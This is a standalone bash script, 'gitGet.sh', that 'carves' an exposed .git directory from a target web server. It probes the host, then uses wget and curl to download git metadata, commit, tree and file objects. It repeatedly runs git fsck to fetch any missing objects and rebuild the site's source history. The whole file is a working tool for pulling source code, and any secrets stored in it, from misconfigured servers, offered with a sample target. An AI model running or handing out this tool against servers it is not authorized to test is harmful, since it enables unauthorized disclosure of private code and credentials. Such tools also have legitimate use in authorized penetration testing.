#/bin/bash

HOST="$1"
if [ "$HOST" == "" ]
then
        echo ".-------------------------------------------------------."
        echo "| Requires: git                                         |"
        echo "+-------------------------------------------------------+"
        echo "| USAGE:    bash gitGet.sh hostname (path)              |"
        echo "|           if the .git folder is not in the            |"
        echo "|           root of target.host, then specify the path  |"
        echo "+-------------------------------------------------------+"
        echo "| Example:  bash gitGet.sh target.host /secret/folder/  |"
        echo "'-------------------------------------------------------'"
else

STANDARD_FILES=("HEAD" "objects/info/packs" \
"description" "config" "COMMIT_EDITMSG" \
"index" "packed-refs" "refs/heads/master" \
"refs/remotes/origin/HEAD" "refs/stash" \
"logs/HEAD" "logs/refs/heads/master" \
"logs/refs/remotes/origin/HEAD" "info/refs" \
"info/exclude")
GITLOG="gitLog.txt"
echo "" > "$GITLOG"

CONNECTABLE=$(ping -c 1 -W 2 "$HOST" | grep received| sed -e 's/^.*transmitted, //' -e 's/ received,.*$//')
if [ "$CONNECTABLE" -eq 0 ]
then
        echo ".-------------------------------------------------------."
        echo "|  The host $HOST is unreachable! "
        echo "|  Aborting operation!                                  |"
        echo "'-------------------------------------------------------'"
else
        echo ".-------------------------------------------------------."
        echo "|    Host $HOST is alive! "
        echo "|    Starting GIT carving...                            |"
        echo "+-------------------------------------------------------+"
        mkdir ".git"
        
        for file in "${STANDARD_FILES[@]}"
        do
                if wget --spider "$HOST/.git/$file" 2>/dev/null
                then
                        echo "|  FILE .git/$file exists! Downloading... "
                        DIR=$(echo $file|grep -Eo "^.*/")
                        if [ "$DIR" != "" ]
                        then
                                mkdir -p ".git/$DIR" && touch ".git/$file"
                                echo "Created: .git/$DIR" >> "$GITLOG"
                        else
                                touch ".git/$file"
                        fi
                        curl -L $HOST"/.git/"$file -s > ".git/$file"
                        echo "Carved:  file .git/$file" >> "$GITLOG"
                        ##THESE TWO FILES CONTAIN INFO ABOUT THE COMMITS
                        ##WHICH WE NEED TO BE ABLE TO REBUILD EVERYTHING
                        if [ "$file" == "logs/refs/heads/master" ]
                        then
                                LOGHMASTER="1"
                        elif [ "$file" == "refs/heads/master" ]
                        then
                                HMASTER="1"
                        fi

                else
                        echo "|  FILE .git/$file not found! "
                fi
        done

        echo "+-------------------------------------------------------+"
        echo "| FINISHED CARVING STANDARD FILES                       |"
        echo "'-------------------------------------------------------'"
        echo ".-------------------------------------------------------."
        echo "| CHECKING FOR COMMITS AND TREES USING DOWNLOADED FILES |"
        echo "+-------------------------------------------------------+"

        ##IF WE WERE LUCKY, AND HAD EITHER OF THESE FILES
        ##WE CAN CARVE THE LIST OF COMMIT FILES
        if [[ "$LOGHMASTER" -eq "1" && "$HMASTER" -eq "1" ]]
        then
                ##CHECK IF REFS HEADS MASTER IS LISTED IN LOGS REFS HEADS MASTER
                CHECK=$(grep -o $(cat .git/refs/heads/master) .git/logs/refs/heads/master)
                if [ "$CHECK" != "" ]
                then
                        ##IF NOT, WE'LL ADD BOTH TO OUR ARRAY OF COMMITS TO GET
                        COMMITS=($(cat .git/logs/refs/heads/master | awk '{print $2}'))
                        COMMITS+=($(cat .git/refs/heads/master))
                else
                        ##IF IT IS, WE JUST ADD THE LATTER TO OUR ARRAY OF COMMITS TO GET
                        COMMITS=($(cat .git/logs/refs/heads/master | awk '{print $2}'))
                fi
        elif [[ "$LOGHMASTER" -eq "1" && "$HMASTER" -eq "0" ]]
        then
                COMMITS=($(cat .git/logs/refs/heads/master | awk '{print $2}'))
        elif [[ "$LOGHMASTER" -eq "0" && "$HMASTER" -eq "1" ]]
        then
                COMMITS=($(cat .git/refs/heads/master))
        fi

        for commit in "${COMMITS[@]}"
        do
                CARVE=".git/objects/"
                DIR=$(echo $commit | grep -o ^..)
                CDIR="$CARVE/$DIR"
                CARVE+="$DIR"
                CARVE+=$(echo $commit | sed 's/../\//')

                if wget --spider "$HOST/$CARVE" 2>/dev/null
                then
                        mkdir -p "$CDIR"
                        echo "|  COMMIT FILE $CARVE exists! Downloading... "
                        curl -L $HOST"/"$CARVE -s > "$CARVE"
                        echo "Carved:  commit $CARVE" >> "$GITLOG"
                fi

                TREE=$(git cat-file -p $commit|grep tree|sed 's/tree //')
                TREECARVE=".git/objects/"
                TREEDIR=$(echo $TREE | grep -o ^..)
                TDIR="$TREECARVE/$TREEDIR"
                TREECARVE+="$TREEDIR"
                TREECARVE+=$(echo $TREE | sed 's/../\//')
                if wget --spider "$HOST/$TREECARVE" 2>/dev/null
                then
                        mkdir -p "$TDIR"
                        TREELIST+=("$TREE")
                        echo "|  TREE OBJECT $TREECARVE exists! Downloading... "
                        curl -L $HOST"/"$TREECARVE -s > "$TREECARVE"
                        echo "Carved:  tree $TREECARVE" >> "$GITLOG"
                fi
        done
        echo "+------------------------------------------------------+"
        echo "| FINISHED CARVING COMMITS AND TREE OBJECTS            |"
        echo "'------------------------------------------------------'"
        echo ".------------------------------------------------------."
        echo "| CARVING FILE OBJECTS USING THE TREE OBJECTS          |"
        echo "+------------------------------------------------------+"

        ##REMOVE DOUBLES
        UNIQUETREES=($(echo "${TREELIST[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
        ##GET ALL FILEOBJECTS  LISTED IN FILETREES
        for tree in "${UNIQUETREES[@]}"
        do
                FILETREE+=($(git cat-file -p $tree|awk '{print $3}'))
        done
        ##REMOVE DUPLICATE FILEOBJECTS
        UNIQUEFILES=($(echo "${FILETREE[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
        for treeFile in "${UNIQUEFILES[@]}"
        do
                FILETREECARVE=".git/objects/"
                FILETREEDIR=$(echo $treeFile | grep -o ^..)
                FTDIR="$FILETREECARVE/$FILETREEDIR"
                FILETREECARVE+="$FILETREEDIR"
                FILETREECARVE+=$(echo $treeFile | sed 's/../\//')
                if wget --spider "$HOST/$FILETREECARVE" 2>/dev/null
                then
                        mkdir -p "$FTDIR"
                        echo "|  FILE OBJECT $FILETREECARVE exists! Downloading... "
                        curl -L $HOST"/"$FILETREECARVE -s > "$FILETREECARVE"
                        echo "Carved:  file $FILETREECARVE" >> "$GITLOG"
                fi
        done

        echo "+------------------------------------------------------+"
        echo "| FINISHED CARVING FILE OBJECTS FROM TREES             |"
        echo "'------------------------------------------------------'"
        ERRCOUNT="0"

errFunc() {
        ##TRY CARVING MISSING FILES
        ERRCOUNT=$((ERRCOUNT+1))
        echo ".------------------------------------------------------."
        echo "| CARVING MISSING OBJECTS AND TREES, ROUND $ERRCOUNT           |"
        echo "+------------------------------------------------------+"
        git fsck &> errors
        if [ "$(wc -l errors|sed 's/ .*//')" -lt "0" ]
        then
                ERRCOUNT="16"
        else
        MISSING=($(cat errors|grep error|awk '{print $2}'|sed 's/://g'))
        MISSING+=($(cat errors|grep missing|awk '{print $3}'))
        for errFile in "${MISSING[@]}"
        do
                ERRCARVE=".git/objects/"
                ERRDIR=$(echo $errFile | grep -o ^..)
                EDIR="$ERRCARVE/$ERRDIR"
                ERRCARVE+="$ERRDIR"
                ERRCARVE+=$(echo $errFile | sed 's/../\//')
                if wget --spider "$HOST/$ERRCARVE" 2>/dev/null
                then
                        mkdir -p "$EDIR"
                        echo "|  OBJECT $ERRCARVE exists! Downloading... "
                        curl -L $HOST"/"$ERRCARVE -s > "$ERRCARVE"
                        echo "Carved:  file $ERRCARVE" >> "$GITLOG"
                fi
        done
        rm errors
        fi
}
while [ "$ERRCOUNT" -lt "15" ]
do
        errFunc
done
        echo "+------------------------------------------------------+"
        echo "| FINISHED CARVING MISSING OBJECTS AND TREES           |"
        echo "+------------------------------------------------------+"
        echo "| RESULTS SAVED IN gitLog.txt                          |"
        echo "+------------------------------------------------------+"
        sleep 1
fi
fi
